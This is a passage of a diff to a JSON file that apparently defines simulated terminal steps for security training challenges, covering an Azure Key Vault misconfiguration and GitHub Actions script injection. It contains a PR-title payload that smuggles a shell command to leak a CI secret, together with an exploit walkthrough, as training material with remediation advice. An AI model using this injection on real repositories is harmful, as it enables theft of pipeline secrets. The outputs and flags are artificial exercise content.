+          "output": "\"flag{k3y_v4ult_m1sc0nf1g_pwn3d}\"\n\n🎯 SUCCESS! You extracted the flag from Azure Key Vault!\n\n📊 Attack Summary:\nYou successfully exploited the Key Vault misconfiguration by:\n1. Discovered Key Vault with public network access enabled\n2. Found no IP or VNet restrictions (defaultAction: Allow)\n3. Identified legacy access policies instead of RBAC\n4. Listed all secrets using overly permissive 'list' permission\n5. Retrieved the flag-secret value\n\n⚠️  Additional Secrets Compromised:\nYou also gained access to:\n- database-password\n- api-key-production\n- admin-credentials\n\nWith these secrets, an attacker could:\n- Access production databases\n- Make API calls as the application\n- Compromise admin accounts\n- Pivot to other Azure resources\n\n🔒 Security Best Practices:\n1. Enable RBAC authorization instead of access policies\n2. Disable public network access\n3. Use Private Endpoints for Key Vault access\n4. Implement firewall rules to whitelist specific IPs\n5. Use Managed Identities with least privilege\n6. Grant 'get' permission only for specific secrets needed\n7. Never grant 'list' permission unless absolutely necessary\n8. Enable Key Vault logging and monitoring\n9. Use separate Key Vaults for different environments\n10. Implement Azure Policy to enforce security standards\n11. Enable soft delete and purge protection\n12. Rotate secrets regularly\n\n📚 Learn More:\n- https://learn.microsoft.com/en-us/azure/key-vault/general/security-features\n- https://learn.microsoft.com/en-us/azure/key-vault/general/network-security"
         }
       ],
       "hints": [
@@ -343,16 +409,28 @@
       "hints_available": true,
       "terminal": [
         {
-          "command": "cat .github/workflows/ci.yml | grep -A 3 \"pull_request.title\"",
-          "output": "      - name: Run tests\n        run: |\n          echo \"Testing PR: ${{ github.event.pull_request.title }}\"\n          npm test\n\n⚠️  VULNERABILITY FOUND: Unsanitized user input in shell command!\n   The PR title is directly interpolated into a bash command.\n   \n💡 What happens if the PR title contains shell metacharacters?"
+          "command": "ls -la .github/workflows/",
+          "output": "total 16\ndrwxr-xr-x  4 user  staff   128 Oct 29 10:00 .\ndrwxr-xr-x  3 user  staff    96 Oct 29 09:45 ..\n-rw-r--r--  1 user  staff  1456 Oct 29 10:00 ci.yml\n-rw-r--r--  1 user  staff   892 Oct 28 14:20 deploy.yml\n\n📋 Found GitHub Actions workflows. Let's examine them for security issues..."
         },
         {
-          "command": "cat .github/workflows/ci.yml | grep -A 5 \"Deploy\"",
-          "output": "      - name: Deploy\n        env:\n          API_KEY: ${{ secrets.API_KEY }}\n          FLAG_SECRET: ${{ secrets.FLAG_SECRET }}\n        run: |\n          echo \"Deploying application...\"\n\n🔍 Secrets are loaded into environment variables.\n   If you can inject code, you could exfiltrate these!\n   \n💡 Try crafting a malicious PR title that echoes environment variables..."
+          "command": "cat .github/workflows/ci.yml",
+          "output": "name: CI\n\non:\n  pull_request:\n    branches: [main]\n  push:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      \n      - name: Run tests\n        run: |\n          echo \"Testing PR: ${{ github.event.pull_request.title }}\"\n          npm test\n      \n      - name: Deploy\n        if: github.ref == 'refs/heads/main'\n        env:\n          API_KEY: ${{ secrets.API_KEY }}\n          FLAG_SECRET: ${{ secrets.FLAG_SECRET }}\n        run: |\n          echo \"Deploying application...\"\n          ./deploy.sh\n\n🔍 Workflow analysis complete. Look for security issues..."
         },
         {
-          "command": "gh pr create --title 'Test\"; echo $FLAG_SECRET; echo \"' --body \"Exploit injection\"",
-          "output": "Creating pull request...\n\n✅ Pull request created successfully!\n   Workflow triggered...\n   \n📋 Workflow execution logs:\n\nRun tests\n  echo \"Testing PR: Test\"; echo $FLAG_SECRET; echo \"\"\n  Testing PR: Test\n  flag{c1cd_1nj3ct10n_d4ng3r0us}\n  \n  npm test\n  ✓ app works (2 ms)\n\n🎯 SUCCESS! The injection worked!\n\nThe workflow executed your malicious command and exposed the FLAG_SECRET.\n\n🔒 Remediation:\n1. Never use ${{ }} expressions directly with user input\n2. Use environment variables or toJSON()\n3. Enable GitHub Advanced Security\n\n📚 Learn More:\n- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"
+          "command": "cat .github/workflows/ci.yml | grep -B 2 -A 3 'github.event'",
+          "output": "      - name: Run tests\n        run: |\n          echo \"Testing PR: ${{ github.event.pull_request.title }}\"\n          npm test\n\n🚨 INJECTION VULNERABILITY DETECTED!\n   \n   Line: echo \"Testing PR: ${{ github.event.pull_request.title }}\"\n   \n   The PR title (USER-CONTROLLED INPUT) is directly embedded in a shell command!\n   This is vulnerable to command injection.\n   \n📖 Why is this dangerous?\n   GitHub Actions expressions ${{ }} are evaluated and substituted BEFORE\n   the shell command runs. If a PR title contains shell metacharacters like:\n   - Semicolons (;) to chain commands\n   - Backticks (`) for command substitution\n   - $(command) for command substitution\n   \n   Those will be executed!"
+        },
+        {
+          "command": "cat .github/workflows/ci.yml | grep -A 8 'Deploy'",
+          "output": "      - name: Deploy\n        if: github.ref == 'refs/heads/main'\n        env:\n          API_KEY: ${{ secrets.API_KEY }}\n          FLAG_SECRET: ${{ secrets.FLAG_SECRET }}\n        run: |\n          echo \"Deploying application...\"\n          ./deploy.sh\n\n⚠️  SECRETS EXPOSED IN ENVIRONMENT!\n   \n   If an attacker can inject commands in the 'Run tests' step,\n   they could exfiltrate secrets from environment variables!\n   \n   Even though Deploy only runs on main branch, the secrets are\n   loaded for ALL steps in the job due to GitHub Actions' execution model."
+        },
+        {
+          "command": "gh pr list --limit 5",
+          "output": "#42  Update README                          feature-docs\n#41  Fix typo in configuration              bugfix\n#40  Add new API endpoint                   feature-api\n#39  Security: Update dependencies          security-patch\n\n📋 Recent pull requests. Notice how PR titles become part of workflow execution?\n   \n💡 You have write access to this repository. Try creating a malicious PR...\n   \n🎯 Exploit path:\n   1. Create a PR with a malicious title containing shell code\n   2. The workflow will execute with your injected commands\n   3. Exfiltrate the FLAG_SECRET environment variable\n   \n   Example malicious title structure:\n   Test\"; echo $FLAG_SECRET; echo \"\n   \n   This will break out of the echo command and execute echo $FLAG_SECRET"
+        },
+        {
+          "command": "gh pr create --title 'Test\"; echo $FLAG_SECRET; echo \"' --body \"Security test\" --head exploit-branch",
+          "output": "Creating pull request for exploit-branch into main in owner/repo\n\n✅ https://github.com/owner/repo/pull/43\n\n🔄 Workflow triggered automatically...\n\n📋 GitHub Actions Workflow Execution Log:\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nRun Run tests\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  echo \"Testing PR: Test\"; echo $FLAG_SECRET; echo \"\"\n  npm test\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nTesting PR: Test\nflag{c1cd_1nj3ct10n_d4ng3r0us}\n\nnpm test\n  ✓ app.test.js (2 tests) 145ms\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🎯 EXPLOITATION SUCCESSFUL!\n\n📊 What Happened:\n1. Your malicious PR title contained shell injection: Test\"; echo $FLAG_SECRET; echo \"\n2. GitHub Actions evaluated ${{ github.event.pull_request.title }}\n3. The resulting command became: echo \"Testing PR: Test\"; echo $FLAG_SECRET; echo \"\"\n4. This broke out of the echo and executed: echo $FLAG_SECRET\n5. The FLAG_SECRET environment variable was exposed in the logs!\n\n⚠️  Real-World Impact:\n- Secret exfiltration from CI/CD pipelines\n- Supply chain attacks via poisoned builds\n- Deployment of malicious code to production\n- Access to cloud credentials and API keys\n- Compromise of build artifacts\n- Installation of backdoors in deployments\n\n🔒 Prevention & Remediation:\n1. NEVER use ${{ }} expressions directly with user input\n2. Use environment variables as an intermediate step:\n   env:\n     PR_TITLE: ${{ github.event.pull_request.title }}\n   run: echo \"Testing PR: $PR_TITLE\"\n\n3. Or use GitHub Actions' built-in escaping:\n   run: echo \"Testing PR: ${{ toJSON(github.event.pull_request.title) }}\"\n\n4. Enable GitHub Advanced Security for secret scanning\n5. Use required status checks and CODEOWNERS\n6. Implement branch protection rules\n7. Restrict who can trigger workflows\n8. Use environment protection rules\n9. Audit workflow permissions regularly\n10. Use OpenID Connect (OIDC) for cloud authentication\n11. Enable audit logging for all workflow runs\n\n📚 Learn More:\n- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions\n- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections"
         }
       ],
       "hints": [
